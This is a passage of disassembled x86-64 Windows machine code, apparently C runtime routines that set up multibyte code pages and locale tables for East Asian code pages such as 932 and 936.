   14000510b:	0f b6 57 01          	movzbl 0x1(%rdi),%edx
   14000510f:	44 0f b6 c0          	movzbl %al,%r8d
   140005113:	44 3b c2             	cmp    %edx,%r8d
   140005116:	77 16                	ja     0x14000512e
   140005118:	41 2b d0             	sub    %r8d,%edx
   14000511b:	41 8b c0             	mov    %r8d,%eax
   14000511e:	4a 8d 4c 04 70       	lea    0x70(%rsp,%r8,1),%rcx
   140005123:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140005127:	b2 20                	mov    $0x20,%dl
   140005129:	e8 f2 07 00 00       	call   0x140005920
   14000512e:	48 83 c7 02          	add    $0x2,%rdi
   140005132:	8a 07                	mov    (%rdi),%al
   140005134:	84 c0                	test   %al,%al
   140005136:	75 d3                	jne    0x14000510b
   140005138:	8b 46 0c             	mov    0xc(%rsi),%eax
   14000513b:	83 64 24 38 00       	andl   $0x0,0x38(%rsp)
   140005140:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140005145:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140005149:	8b 46 04             	mov    0x4(%rsi),%eax
   14000514c:	44 8b cb             	mov    %ebx,%r9d
   14000514f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140005153:	48 8d 85 70 02 00 00 	lea    0x270(%rbp),%rax
   14000515a:	ba 01 00 00 00       	mov    $0x1,%edx
   14000515f:	33 c9                	xor    %ecx,%ecx
   140005161:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005166:	e8 11 16 00 00       	call   0x14000677c
   14000516b:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140005170:	8b 46 04             	mov    0x4(%rsi),%eax
   140005173:	8b 56 0c             	mov    0xc(%rsi),%edx
   140005176:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000517a:	48 8d 45 70          	lea    0x70(%rbp),%rax
   14000517e:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140005182:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005187:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   14000518c:	44 8b c3             	mov    %ebx,%r8d
   14000518f:	33 c9                	xor    %ecx,%ecx
   140005191:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140005195:	e8 ea 13 00 00       	call   0x140006584
   14000519a:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   14000519f:	8b 46 04             	mov    0x4(%rsi),%eax
   1400051a2:	8b 56 0c             	mov    0xc(%rsi),%edx
   1400051a5:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1400051a9:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   1400051b0:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1400051b4:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400051b9:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   1400051be:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   1400051c4:	33 c9                	xor    %ecx,%ecx
   1400051c6:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1400051ca:	e8 b5 13 00 00       	call   0x140006584
   1400051cf:	48 8d 55 70          	lea    0x70(%rbp),%rdx
   1400051d3:	4c 8d 85 70 01 00 00 	lea    0x170(%rbp),%r8
   1400051da:	48 2b d6             	sub    %rsi,%rdx
   1400051dd:	4c 8d 9d 70 02 00 00 	lea    0x270(%rbp),%r11
   1400051e4:	48 8d 4e 1d          	lea    0x1d(%rsi),%rcx
   1400051e8:	4c 2b c6             	sub    %rsi,%r8
   1400051eb:	41 f6 03 01          	testb  $0x1,(%r11)
   1400051ef:	74 09                	je     0x1400051fa
   1400051f1:	80 09 10             	orb    $0x10,(%rcx)
   1400051f4:	8a 44 0a e3          	mov    -0x1d(%rdx,%rcx,1),%al
   1400051f8:	eb 0e                	jmp    0x140005208
   1400051fa:	41 f6 03 02          	testb  $0x2,(%r11)
   1400051fe:	74 10                	je     0x140005210
   140005200:	80 09 20             	orb    $0x20,(%rcx)
   140005203:	41 8a 44 08 e3       	mov    -0x1d(%r8,%rcx,1),%al
   140005208:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   14000520e:	eb 07                	jmp    0x140005217
   140005210:	c6 81 00 01 00 00 00 	movb   $0x0,0x100(%rcx)
   140005217:	48 ff c1             	inc    %rcx
   14000521a:	49 83 c3 02          	add    $0x2,%r11
   14000521e:	48 ff cb             	dec    %rbx
   140005221:	75 c8                	jne    0x1400051eb
   140005223:	eb 3f                	jmp    0x140005264
   140005225:	33 d2                	xor    %edx,%edx
   140005227:	48 8d 4e 1d          	lea    0x1d(%rsi),%rcx
   14000522b:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   14000522f:	41 8d 40 20          	lea    0x20(%r8),%eax
   140005233:	83 f8 19             	cmp    $0x19,%eax
   140005236:	77 08                	ja     0x140005240
   140005238:	80 09 10             	orb    $0x10,(%rcx)
   14000523b:	8d 42 20             	lea    0x20(%rdx),%eax
   14000523e:	eb 0c                	jmp    0x14000524c
   140005240:	41 83 f8 19          	cmp    $0x19,%r8d
   140005244:	77 0e                	ja     0x140005254
   140005246:	80 09 20             	orb    $0x20,(%rcx)
   140005249:	8d 42 e0             	lea    -0x20(%rdx),%eax
   14000524c:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   140005252:	eb 07                	jmp    0x14000525b
   140005254:	c6 81 00 01 00 00 00 	movb   $0x0,0x100(%rcx)
   14000525b:	ff c2                	inc    %edx
   14000525d:	48 ff c1             	inc    %rcx
   140005260:	3b d3                	cmp    %ebx,%edx
   140005262:	72 c7                	jb     0x14000522b
   140005264:	48 8b 8d 70 04 00 00 	mov    0x470(%rbp),%rcx
   14000526b:	48 33 cc             	xor    %rsp,%rcx
   14000526e:	e8 bd f4 ff ff       	call   0x140004730
   140005273:	4c 8d 9c 24 80 05 00 	lea    0x580(%rsp),%r11
   14000527a:	00 
   14000527b:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   14000527f:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140005283:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140005287:	49 8b e3             	mov    %r11,%rsp
   14000528a:	5d                   	pop    %rbp
   14000528b:	c3                   	ret
   14000528c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005291:	57                   	push   %rdi
   140005292:	48 83 ec 20          	sub    $0x20,%rsp
   140005296:	e8 05 e3 ff ff       	call   0x1400035a0
   14000529b:	48 8b f8             	mov    %rax,%rdi
   14000529e:	8b 88 c8 00 00 00    	mov    0xc8(%rax),%ecx
   1400052a4:	85 0d fe 6b 00 00    	test   %ecx,0x6bfe(%rip)        # 0x14000bea8
   1400052aa:	74 13                	je     0x1400052bf
   1400052ac:	48 83 b8 c0 00 00 00 	cmpq   $0x0,0xc0(%rax)
   1400052b3:	00 
   1400052b4:	74 09                	je     0x1400052bf
   1400052b6:	48 8b 98 b8 00 00 00 	mov    0xb8(%rax),%rbx
   1400052bd:	eb 6c                	jmp    0x14000532b
   1400052bf:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1400052c4:	e8 8b e9 ff ff       	call   0x140003c54
   1400052c9:	90                   	nop
   1400052ca:	48 8b 9f b8 00 00 00 	mov    0xb8(%rdi),%rbx
   1400052d1:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400052d6:	48 3b 1d 13 6a 00 00 	cmp    0x6a13(%rip),%rbx        # 0x14000bcf0
   1400052dd:	74 42                	je     0x140005321
   1400052df:	48 85 db             	test   %rbx,%rbx
   1400052e2:	74 1b                	je     0x1400052ff
   1400052e4:	f0 ff 0b             	lock decl (%rbx)
   1400052e7:	75 16                	jne    0x1400052ff
   1400052e9:	48 8d 05 d0 65 00 00 	lea    0x65d0(%rip),%rax        # 0x14000b8c0
   1400052f0:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400052f5:	48 3b c8             	cmp    %rax,%rcx
   1400052f8:	74 05                	je     0x1400052ff
   1400052fa:	e8 ed ca ff ff       	call   0x140001dec
   1400052ff:	48 8b 05 ea 69 00 00 	mov    0x69ea(%rip),%rax        # 0x14000bcf0
   140005306:	48 89 87 b8 00 00 00 	mov    %rax,0xb8(%rdi)
   14000530d:	48 8b 05 dc 69 00 00 	mov    0x69dc(%rip),%rax        # 0x14000bcf0
   140005314:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005319:	f0 ff 00             	lock incl (%rax)
   14000531c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005321:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140005326:	e8 29 e8 ff ff       	call   0x140003b54
   14000532b:	48 85 db             	test   %rbx,%rbx
   14000532e:	75 08                	jne    0x140005338
   140005330:	8d 4b 20             	lea    0x20(%rbx),%ecx
   140005333:	e8 b4 d1 ff ff       	call   0x1400024ec
   140005338:	48 8b c3             	mov    %rbx,%rax
   14000533b:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140005340:	48 83 c4 20          	add    $0x20,%rsp
   140005344:	5f                   	pop    %rdi
   140005345:	c3                   	ret
   140005346:	cc                   	int3
   140005347:	cc                   	int3
   140005348:	40 53                	rex push %rbx
   14000534a:	48 83 ec 20          	sub    $0x20,%rsp
   14000534e:	48 8b d9             	mov    %rcx,%rbx
   140005351:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   140005355:	48 85 d2             	test   %rdx,%rdx
   140005358:	75 7f                	jne    0x1400053d9
   14000535a:	e8 41 e2 ff ff       	call   0x1400035a0
   14000535f:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140005363:	48 8b 90 c0 00 00 00 	mov    0xc0(%rax),%rdx
   14000536a:	48 89 13             	mov    %rdx,(%rbx)
   14000536d:	48 8b 88 b8 00 00 00 	mov    0xb8(%rax),%rcx
   140005374:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   140005378:	48 3b 15 31 65 00 00 	cmp    0x6531(%rip),%rdx        # 0x14000b8b0
   14000537f:	74 16                	je     0x140005397
   140005381:	8b 80 c8 00 00 00    	mov    0xc8(%rax),%eax
   140005387:	85 05 1b 6b 00 00    	test   %eax,0x6b1b(%rip)        # 0x14000bea8
   14000538d:	75 08                	jne    0x140005397
   14000538f:	e8 04 fc ff ff       	call   0x140004f98
   140005394:	48 89 03             	mov    %rax,(%rbx)
   140005397:	48 8b 05 52 69 00 00 	mov    0x6952(%rip),%rax        # 0x14000bcf0
   14000539e:	48 39 43 08          	cmp    %rax,0x8(%rbx)
   1400053a2:	74 1b                	je     0x1400053bf
   1400053a4:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400053a8:	8b 88 c8 00 00 00    	mov    0xc8(%rax),%ecx
   1400053ae:	85 0d f4 6a 00 00    	test   %ecx,0x6af4(%rip)        # 0x14000bea8
   1400053b4:	75 09                	jne    0x1400053bf
   1400053b6:	e8 d1 fe ff ff       	call   0x14000528c
   1400053bb:	48 89 43 08          	mov    %rax,0x8(%rbx)
   1400053bf:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400053c3:	f6 80 c8 00 00 00 02 	testb  $0x2,0xc8(%rax)
   1400053ca:	75 14                	jne    0x1400053e0
   1400053cc:	83 88 c8 00 00 00 02 	orl    $0x2,0xc8(%rax)
   1400053d3:	c6 43 18 01          	movb   $0x1,0x18(%rbx)
   1400053d7:	eb 07                	jmp    0x1400053e0
   1400053d9:	0f 10 02             	movups (%rdx),%xmm0
   1400053dc:	f3 0f 7f 01          	movdqu %xmm0,(%rcx)
   1400053e0:	48 8b c3             	mov    %rbx,%rax
   1400053e3:	48 83 c4 20          	add    $0x20,%rsp
   1400053e7:	5b                   	pop    %rbx
   1400053e8:	c3                   	ret
   1400053e9:	cc                   	int3
   1400053ea:	cc                   	int3
   1400053eb:	cc                   	int3
   1400053ec:	40 53                	rex push %rbx
   1400053ee:	48 83 ec 40          	sub    $0x40,%rsp
   1400053f2:	8b d9                	mov    %ecx,%ebx
   1400053f4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400053f9:	33 d2                	xor    %edx,%edx
   1400053fb:	e8 48 ff ff ff       	call   0x140005348
   140005400:	83 25 c9 77 00 00 00 	andl   $0x0,0x77c9(%rip)        # 0x14000cbd0
   140005407:	83 fb fe             	cmp    $0xfffffffe,%ebx
   14000540a:	75 25                	jne    0x140005431
   14000540c:	c7 05 ba 77 00 00 01 	movl   $0x1,0x77ba(%rip)        # 0x14000cbd0
   140005413:	00 00 00 
   140005416:	ff 15 a4 2c 00 00    	call   *0x2ca4(%rip)        # 0x1400080c0
   14000541c:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140005421:	74 53                	je     0x140005476
   140005423:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140005428:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   14000542f:	eb 45                	jmp    0x140005476
   140005431:	83 fb fd             	cmp    $0xfffffffd,%ebx
   140005434:	75 12                	jne    0x140005448
   140005436:	c7 05 90 77 00 00 01 	movl   $0x1,0x7790(%rip)        # 0x14000cbd0
   14000543d:	00 00 00 
   140005440:	ff 15 ba 2c 00 00    	call   *0x2cba(%rip)        # 0x140008100
   140005446:	eb d4                	jmp    0x14000541c
   140005448:	83 fb fc             	cmp    $0xfffffffc,%ebx
   14000544b:	75 14                	jne    0x140005461
   14000544d:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140005452:	c7 05 74 77 00 00 01 	movl   $0x1,0x7774(%rip)        # 0x14000cbd0
   140005459:	00 00 00 
   14000545c:	8b 40 04             	mov    0x4(%rax),%eax
   14000545f:	eb bb                	jmp    0x14000541c
   140005461:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140005466:	74 0c                	je     0x140005474
   140005468:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000546d:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   140005474:	8b c3                	mov    %ebx,%eax
   140005476:	48 83 c4 40          	add    $0x40,%rsp
   14000547a:	5b                   	pop    %rbx
   14000547b:	c3                   	ret
   14000547c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140005481:	55                   	push   %rbp
   140005482:	56                   	push   %rsi
   140005483:	57                   	push   %rdi
   140005484:	41 54                	push   %r12
   140005486:	41 55                	push   %r13
   140005488:	48 83 ec 40          	sub    $0x40,%rsp
   14000548c:	48 8b 05 dd 5f 00 00 	mov    0x5fdd(%rip),%rax        # 0x14000b470
   140005493:	48 33 c4             	xor    %rsp,%rax
   140005496:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000549b:	48 8b f2             	mov    %rdx,%rsi
   14000549e:	e8 49 ff ff ff       	call   0x1400053ec
   1400054a3:	33 db                	xor    %ebx,%ebx
   1400054a5:	8b f8                	mov    %eax,%edi
   1400054a7:	85 c0                	test   %eax,%eax
   1400054a9:	75 0d                	jne    0x1400054b8
   1400054ab:	48 8b ce             	mov    %rsi,%rcx
   1400054ae:	e8 5d fb ff ff       	call   0x140005010
   1400054b3:	e9 16 02 00 00       	jmp    0x1400056ce
   1400054b8:	4c 8d 2d 41 68 00 00 	lea    0x6841(%rip),%r13        # 0x14000bd00
   1400054bf:	8b cb                	mov    %ebx,%ecx
   1400054c1:	48 8b eb             	mov    %rbx,%rbp
   1400054c4:	49 8b c5             	mov    %r13,%rax
   1400054c7:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   1400054cd:	39 38                	cmp    %edi,(%rax)
   1400054cf:	0f 84 26 01 00 00    	je     0x1400055fb
   1400054d5:	41 03 cc             	add    %r12d,%ecx
   1400054d8:	49 03 ec             	add    %r12,%rbp
   1400054db:	48 83 c0 30          	add    $0x30,%rax
   1400054df:	83 f9 05             	cmp    $0x5,%ecx
   1400054e2:	72 e9                	jb     0x1400054cd
   1400054e4:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
   1400054ea:	0f 84 03 01 00 00    	je     0x1400055f3
   1400054f0:	81 ff e9 fd 00 00    	cmp    $0xfde9,%edi
   1400054f6:	0f 84 f7 00 00 00    	je     0x1400055f3
   1400054fc:	0f b7 cf             	movzwl %di,%ecx
   1400054ff:	ff 15 b3 2b 00 00    	call   *0x2bb3(%rip)        # 0x1400080b8
   140005505:	85 c0                	test   %eax,%eax
   140005507:	0f 84 e6 00 00 00    	je     0x1400055f3
   14000550d:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140005512:	8b cf                	mov    %edi,%ecx
   140005514:	ff 15 ee 2b 00 00    	call   *0x2bee(%rip)        # 0x140008108
   14000551a:	85 c0                	test   %eax,%eax
   14000551c:	0f 84 c5 00 00 00    	je     0x1400055e7
   140005522:	48 8d 4e 1c          	lea    0x1c(%rsi),%rcx
   140005526:	33 d2                	xor    %edx,%edx
   140005528:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   14000552e:	e8 ed 03 00 00       	call   0x140005920
   140005533:	89 7e 04             	mov    %edi,0x4(%rsi)
   140005536:	89 5e 0c             	mov    %ebx,0xc(%rsi)
   140005539:	44 39 64 24 20       	cmp    %r12d,0x20(%rsp)
   14000553e:	0f 86 8c 00 00 00    	jbe    0x1400055d0
   140005544:	48 8d 44 24 26       	lea    0x26(%rsp),%rax
   140005549:	38 5c 24 26          	cmp    %bl,0x26(%rsp)
   14000554d:	74 2d                	je     0x14000557c
   14000554f:	38 58 01             	cmp    %bl,0x1(%rax)
   140005552:	74 28                	je     0x14000557c
   140005554:	0f b6 38             	movzbl (%rax),%edi
   140005557:	0f b6 48 01          	movzbl 0x1(%rax),%ecx
   14000555b:	3b f9                	cmp    %ecx,%edi
   14000555d:	77 15                	ja     0x140005574
   14000555f:	2b cf                	sub    %edi,%ecx
   140005561:	48 8d 54 37 1d       	lea    0x1d(%rdi,%rsi,1),%rdx
   140005566:	41 03 cc             	add    %r12d,%ecx
   140005569:	80 0a 04             	orb    $0x4,(%rdx)
   14000556c:	49 03 d4             	add    %r12,%rdx
   14000556f:	49 2b cc             	sub    %r12,%rcx
   140005572:	75 f5                	jne    0x140005569
   140005574:	48 83 c0 02          	add    $0x2,%rax
   140005578:	38 18                	cmp    %bl,(%rax)
   14000557a:	75 d3                	jne    0x14000554f
   14000557c:	48 8d 46 1e          	lea    0x1e(%rsi),%rax
   140005580:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   140005585:	80 08 08             	orb    $0x8,(%rax)
   140005588:	49 03 c4             	add    %r12,%rax
   14000558b:	49 2b cc             	sub    %r12,%rcx
   14000558e:	75 f5                	jne    0x140005585
   140005590:	8b 4e 04             	mov    0x4(%rsi),%ecx
   140005593:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   140005599:	74 27                	je     0x1400055c2
   14000559b:	83 e9 04             	sub    $0x4,%ecx
   14000559e:	74 1b                	je     0x1400055bb
   1400055a0:	83 e9 0d             	sub    $0xd,%ecx
   1400055a3:	74 0f                	je     0x1400055b4
   1400055a5:	ff c9                	dec    %ecx
   1400055a7:	74 04                	je     0x1400055ad
   1400055a9:	8b c3                	mov    %ebx,%eax
   1400055ab:	eb 1a                	jmp    0x1400055c7
   1400055ad:	b8 04 04 00 00       	mov    $0x404,%eax
   1400055b2:	eb 13                	jmp    0x1400055c7
   1400055b4:	b8 12 04 00 00       	mov    $0x412,%eax
   1400055b9:	eb 0c                	jmp    0x1400055c7
   1400055bb:	b8 04 08 00 00       	mov    $0x804,%eax
   1400055c0:	eb 05                	jmp    0x1400055c7
   1400055c2:	b8 11 04 00 00       	mov    $0x411,%eax
   1400055c7:	89 46 0c             	mov    %eax,0xc(%rsi)
   1400055ca:	44 89 66 08          	mov    %r12d,0x8(%rsi)
   1400055ce:	eb 03                	jmp    0x1400055d3
   1400055d0:	89 5e 08             	mov    %ebx,0x8(%rsi)
   1400055d3:	48 8d 7e 10          	lea    0x10(%rsi),%rdi
   1400055d7:	0f b7 c3             	movzwl %bx,%eax
   1400055da:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400055df:	66 f3 ab             	rep stos %ax,(%rdi)
   1400055e2:	e9 df 00 00 00       	jmp    0x1400056c6
   1400055e7:	39 1d e3 75 00 00    	cmp    %ebx,0x75e3(%rip)        # 0x14000cbd0
   1400055ed:	0f 85 b8 fe ff ff    	jne    0x1400054ab
   1400055f3:	83 c8 ff             	or     $0xffffffff,%eax
   1400055f6:	e9 d5 00 00 00       	jmp    0x1400056d0
   1400055fb:	48 8d 4e 1c          	lea    0x1c(%rsi),%rcx
   1400055ff:	33 d2                	xor    %edx,%edx
   140005601:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140005607:	e8 14 03 00 00       	call   0x140005920
   14000560c:	4c 8d 54 6d 00       	lea    0x0(%rbp,%rbp,2),%r10
   140005611:	4c 8d 1d e0 66 00 00 	lea    0x66e0(%rip),%r11        # 0x14000bcf8
   140005618:	49 c1 e2 04          	shl    $0x4,%r10
   14000561c:	bd 04 00 00 00       	mov    $0x4,%ebp
   140005621:	4f 8d 44 2a 10       	lea    0x10(%r10,%r13,1),%r8
   140005626:	49 8b c8             	mov    %r8,%rcx
   140005629:	41 38 18             	cmp    %bl,(%r8)
   14000562c:	74 31                	je     0x14000565f
   14000562e:	38 59 01             	cmp    %bl,0x1(%rcx)
   140005631:	74 2c                	je     0x14000565f
   140005633:	0f b6 11             	movzbl (%rcx),%edx
   140005636:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   14000563a:	3b d0                	cmp    %eax,%edx
   14000563c:	77 19                	ja     0x140005657
   14000563e:	4c 8d 4c 32 1d       	lea    0x1d(%rdx,%rsi,1),%r9
   140005643:	41 8a 03             	mov    (%r11),%al
   140005646:	41 03 d4             	add    %r12d,%edx
   140005649:	41 08 01             	or     %al,(%r9)
   14000564c:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   140005650:	4d 03 cc             	add    %r12,%r9
   140005653:	3b d0                	cmp    %eax,%edx
   140005655:	76 ec                	jbe    0x140005643
   140005657:	48 83 c1 02          	add    $0x2,%rcx
   14000565b:	38 19                	cmp    %bl,(%rcx)
   14000565d:	75 cf                	jne    0x14000562e
   14000565f:	49 83 c0 08          	add    $0x8,%r8
   140005663:	4d 03 dc             	add    %r12,%r11
   140005666:	49 2b ec             	sub    %r12,%rbp
   140005669:	75 bb                	jne    0x140005626
   14000566b:	89 7e 04             	mov    %edi,0x4(%rsi)
   14000566e:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   140005674:	44 89 66 08          	mov    %r12d,0x8(%rsi)
   140005678:	74 23                	je     0x14000569d
   14000567a:	83 ef 04             	sub    $0x4,%edi
   14000567d:	74 17                	je     0x140005696
   14000567f:	83 ef 0d             	sub    $0xd,%edi
   140005682:	74 0b                	je     0x14000568f
   140005684:	ff cf                	dec    %edi
   140005686:	75 1a                	jne    0x1400056a2
   140005688:	bb 04 04 00 00       	mov    $0x404,%ebx
   14000568d:	eb 13                	jmp    0x1400056a2
   14000568f:	bb 12 04 00 00       	mov    $0x412,%ebx
   140005694:	eb 0c                	jmp    0x1400056a2
   140005696:	bb 04 08 00 00       	mov    $0x804,%ebx
   14000569b:	eb 05                	jmp    0x1400056a2
   14000569d:	bb 11 04 00 00       	mov    $0x411,%ebx
   1400056a2:	4c 2b d6             	sub    %rsi,%r10
   1400056a5:	89 5e 0c             	mov    %ebx,0xc(%rsi)
   1400056a8:	48 8d 4e 10          	lea    0x10(%rsi),%rcx
   1400056ac:	4b 8d 7c 2a f4       	lea    -0xc(%r10,%r13,1),%rdi
   1400056b1:	ba 06 00 00 00       	mov    $0x6,%edx
   1400056b6:	0f b7 04 0f          	movzwl (%rdi,%rcx,1),%eax
   1400056ba:	66 89 01             	mov    %ax,(%rcx)
   1400056bd:	48 83 c1 02          	add    $0x2,%rcx
   1400056c1:	49 2b d4             	sub    %r12,%rdx
   1400056c4:	75 f0                	jne    0x1400056b6
   1400056c6:	48 8b ce             	mov    %rsi,%rcx
   1400056c9:	e8 ce f9 ff ff       	call   0x14000509c
   1400056ce:	33 c0                	xor    %eax,%eax
   1400056d0:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400056d5:	48 33 cc             	xor    %rsp,%rcx
   1400056d8:	e8 53 f0 ff ff       	call   0x140004730
   1400056dd:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400056e4:	00 
   1400056e5:	48 83 c4 40          	add    $0x40,%rsp
   1400056e9:	41 5d                	pop    %r13
   1400056eb:	41 5c                	pop    %r12
   1400056ed:	5f                   	pop    %rdi
   1400056ee:	5e                   	pop    %rsi
   1400056ef:	5d                   	pop    %rbp
   1400056f0:	c3                   	ret
   1400056f1:	cc                   	int3
   1400056f2:	cc                   	int3
   1400056f3:	cc                   	int3
   1400056f4:	48 8b c4             	mov    %rsp,%rax
   1400056f7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400056fb:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400056ff:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140005703:	4c 89 60 20          	mov    %r12,0x20(%rax)
   140005707:	41 55                	push   %r13
   140005709:	48 83 ec 30          	sub    $0x30,%rsp
   14000570d:	8b f9                	mov    %ecx,%edi
   14000570f:	41 83 cd ff          	or     $0xffffffff,%r13d
   140005713:	e8 88 de ff ff       	call   0x1400035a0
   140005718:	48 8b f0             	mov    %rax,%rsi
   14000571b:	e8 6c fb ff ff       	call   0x14000528c
   140005720:	48 8b 9e b8 00 00 00 	mov    0xb8(%rsi),%rbx
   140005727:	8b cf                	mov    %edi,%ecx
   140005729:	e8 be fc ff ff       	call   0x1400053ec
   14000572e:	44 8b e0             	mov    %eax,%r12d
   140005731:	3b 43 04             	cmp    0x4(%rbx),%eax
   140005734:	0f 84 75 01 00 00    	je     0x1400058af
   14000573a:	b9 20 02 00 00       	mov    $0x220,%ecx
   14000573f:	e8 80 f0 ff ff       	call   0x1400047c4
   140005744:	48 8b d8             	mov    %rax,%rbx
   140005747:	33 ff                	xor    %edi,%edi
   140005749:	48 85 c0             	test   %rax,%rax
   14000574c:	0f 84 62 01 00 00    	je     0x1400058b4
   140005752:	48 8b 96 b8 00 00 00 	mov    0xb8(%rsi),%rdx
   140005759:	48 8b c8             	mov    %rax,%rcx
   14000575c:	41 b8 20 02 00 00    	mov    $0x220,%r8d
   140005762:	e8 f9 f1 ff ff       	call   0x140004960
   140005767:	89 3b                	mov    %edi,(%rbx)
   140005769:	48 8b d3             	mov    %rbx,%rdx
   14000576c:	41 8b cc             	mov    %r12d,%ecx
   14000576f:	e8 08 fd ff ff       	call   0x14000547c
   140005774:	44 8b e8             	mov    %eax,%r13d
   140005777:	85 c0                	test   %eax,%eax
   140005779:	0f 85 0a 01 00 00    	jne    0x140005889
   14000577f:	48 8b 8e b8 00 00 00 	mov    0xb8(%rsi),%rcx
   140005786:	4c 8d 25 33 61 00 00 	lea    0x6133(%rip),%r12        # 0x14000b8c0
   14000578d:	f0 ff 09             	lock decl (%rcx)
   140005790:	75 11                	jne    0x1400057a3
   140005792:	48 8b 8e b8 00 00 00 	mov    0xb8(%rsi),%rcx
   140005799:	49 3b cc             	cmp    %r12,%rcx
   14000579c:	74 05                	je     0x1400057a3
   14000579e:	e8 49 c6 ff ff       	call   0x140001dec
   1400057a3:	48 89 9e b8 00 00 00 	mov    %rbx,0xb8(%rsi)
   1400057aa:	f0 ff 03             	lock incl (%rbx)
   1400057ad:	f6 86 c8 00 00 00 02 	testb  $0x2,0xc8(%rsi)
   1400057b4:	0f 85 fa 00 00 00    	jne    0x1400058b4
   1400057ba:	f6 05 e7 66 00 00 01 	testb  $0x1,0x66e7(%rip)        # 0x14000bea8
   1400057c1:	0f 85 ed 00 00 00    	jne    0x1400058b4
   1400057c7:	be 0d 00 00 00       	mov    $0xd,%esi
   1400057cc:	8b ce                	mov    %esi,%ecx
   1400057ce:	e8 81 e4 ff ff       	call   0x140003c54
   1400057d3:	90                   	nop
   1400057d4:	8b 43 04             	mov    0x4(%rbx),%eax
   1400057d7:	89 05 07 74 00 00    	mov    %eax,0x7407(%rip)        # 0x14000cbe4
   1400057dd:	8b 43 08             	mov    0x8(%rbx),%eax
   1400057e0:	89 05 02 74 00 00    	mov    %eax,0x7402(%rip)        # 0x14000cbe8
   1400057e6:	8b 43 0c             	mov    0xc(%rbx),%eax
   1400057e9:	89 05 fd 73 00 00    	mov    %eax,0x73fd(%rip)        # 0x14000cbec
   1400057ef:	8b d7                	mov    %edi,%edx
   1400057f1:	4c 8d 05 08 a8 ff ff 	lea    -0x57f8(%rip),%r8        # 0x140000000
   1400057f8:	89 54 24 20          	mov    %edx,0x20(%rsp)
   1400057fc:	83 fa 05             	cmp    $0x5,%edx
   1400057ff:	7d 15                	jge    0x140005816
   140005801:	48 63 ca             	movslq %edx,%rcx
   140005804:	0f b7 44 4b 10       	movzwl 0x10(%rbx,%rcx,2),%eax
   140005809:	66 41 89 84 48 d8 cb 	mov    %ax,0xcbd8(%r8,%rcx,2)
   140005810:	00 00 
   140005812:	ff c2                	inc    %edx
   140005814:	eb e2                	jmp    0x1400057f8
   140005816:	8b d7                	mov    %edi,%edx
   140005818:	89 54 24 20          	mov    %edx,0x20(%rsp)
   14000581c:	81 fa 01 01 00 00    	cmp    $0x101,%edx
   140005822:	7d 13                	jge    0x140005837
   140005824:	48 63 ca             	movslq %edx,%rcx
   140005827:	8a 44 19 1c          	mov    0x1c(%rcx,%rbx,1),%al
   14000582b:	42 88 84 01 e0 ba 00 	mov    %al,0xbae0(%rcx,%r8,1)
   140005832:	00 
   140005833:	ff c2                	inc    %edx
   140005835:	eb e1                	jmp    0x140005818
   140005837:	89 7c 24 20          	mov    %edi,0x20(%rsp)
